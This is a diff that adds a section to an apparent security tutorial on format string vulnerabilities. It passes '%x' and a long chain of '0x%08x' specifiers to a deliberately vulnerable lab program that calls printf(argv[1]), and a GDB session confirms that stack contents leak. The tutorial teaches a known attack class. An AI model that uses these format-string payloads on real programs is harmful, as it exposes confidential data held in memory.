@@ -471,3 +471,59 @@ Program received signal SIGSEGV, Segmentation fault.
 1632    vfprintf.c: No such file or directory.
 (gdb) quit
 ```
+#### View the stack
+* Motive
+  * Info leak
+  * Access confidential data stored on the stack
+```sh
+$ ./incorrect_implementation2 %x
+80484c0
+$ ./incorrect_implementation2 "0x%08x"
+0x080484c0
+$ 
+```
+#### ** Debugging in GDB
+```text
+$ gdb ./incorrect_implementation2 -q
+Reading symbols from ./incorrect_implementation2...done.
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804840b <+0>:     push   %ebp
+   0x0804840c <+1>:     mov    %esp,%ebp
+   0x0804840e <+3>:     sub    $0x8,%esp
+   0x08048411 <+6>:     movl   $0x80484c0,-0x8(%ebp)
+   0x08048418 <+13>:    movl   $0x80484d9,-0x4(%ebp)
+   0x0804841f <+20>:    mov    0xc(%ebp),%eax
+   0x08048422 <+23>:    add    $0x4,%eax
+   0x08048425 <+26>:    mov    (%eax),%eax
+   0x08048427 <+28>:    push   %eax
+   0x08048428 <+29>:    call   0x80482e0 <printf@plt>
+   0x0804842d <+34>:    add    $0x4,%esp
+   0x08048430 <+37>:    mov    $0x0,%eax
+   0x08048435 <+42>:    leave
+   0x08048436 <+43>:    ret
+End of assembler dump.
+(gdb) b *0x08048428
+Breakpoint 1 at 0x8048428: file incorrect_implementation2.c, line 6.
+(gdb) run %x
+Starting program: /home/cs/Desktop/3/incorrect_implementation2 %x
+
+Breakpoint 1, 0x08048428 in main (argc=2, argv=0xbffff6e4) at incorrect_implementation2.c:6
+6               printf(argv[1]);
+(gdb) x/8xw $esp
+0xbffff63c:     0xbffff843      0x080484c0      0x080484d9      0x00000000
+0xbffff64c:     0xb7e23637      0x00000002      0xbffff6e4      0xbffff6f0
+(gdb) x/1s 0xbffff843
+0xbffff843:     "%x"
+(gdb) x/18xw $esp
+0xbffff63c:     0xbffff843      0x080484c0      0x080484d9      0x00000000
+0xbffff64c:     0xb7e23637      0x00000002      0xbffff6e4      0xbffff6f0
+0xbffff65c:     0x00000000      0x00000000      0x00000000      0xb7fbd000
+0xbffff66c:     0xb7fffc04      0xb7fff000      0x00000000      0xb7fbd000
+0xbffff67c:     0xb7fbd000      0x00000000
+(gdb) quit
+```
+```sh
+$ ./incorrect_implementation2 "0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x"
+0x080484c0 0x080484d9 0x00000000 0xb7614637 0x00000002 0xbf856294 0xbf8562a0 0x00000000 0x00000000 0x00000000 0xb77ae000 0xb77f0c04 0xb77f0000 0x00000000 0xb77ae000 0xb77ae000 0x00000000 0x4ee2f073
+```
